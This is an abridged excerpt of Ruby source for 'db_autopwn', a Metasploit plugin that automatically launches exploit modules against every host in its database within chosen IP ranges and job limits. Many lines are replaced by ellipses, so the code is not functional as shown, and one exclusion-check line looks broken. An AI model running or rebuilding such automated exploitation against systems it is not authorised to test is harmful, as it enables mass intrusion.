#
# db_autopwn - stripped from previous db commands and modified into a plugin
#
#   Based upon source from neinwechter via GitHub
#		Issues/Bugs should go to alexdba via GitHub
#
#   working ip ranges and job limit
#   tested on MSF 4.5.0
#
#   how to use it:
#   msf > load db_autopwn
...
class Plugin::DBAutopwn < Msf::Plugin
	class DBAutopwnCommandDispatcher
		...
		def cmd_db_autopwn(*args)
			...
			print_error("         Minimal support and development via alexdba on GitHub metasploit fork.")
			print_error("")
			...
			targ_inc = Rex::Socket::RangeWalker.new('')
			targ_exc = Rex::Socket::RangeWalker.new('')
...
#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
					...
					print_line("\t-j  [limit] Max simultaneous jobs (0=unlimited, default 10) ")
			...
			begin
			print_status(targ_inc)
			framework.db.hosts.each do |host|
				xhost = host.address
				next if (targ_inc.valid? and not targ_inc.include?(xhost))
				next if (targ_exc.valid? and targ_inc.include?(targ_exc, xhost))
			...
			matches.each_key do |xref|
				...
				begin
					...
					if (mode & PWN_EXPL != 0)
						...
						if(mjob > 0 and autopwn_jobs.length >= mjob)
							print_status("Job limit reached, waiting on modules to finish...")
							while(autopwn_jobs.length >= mjob)
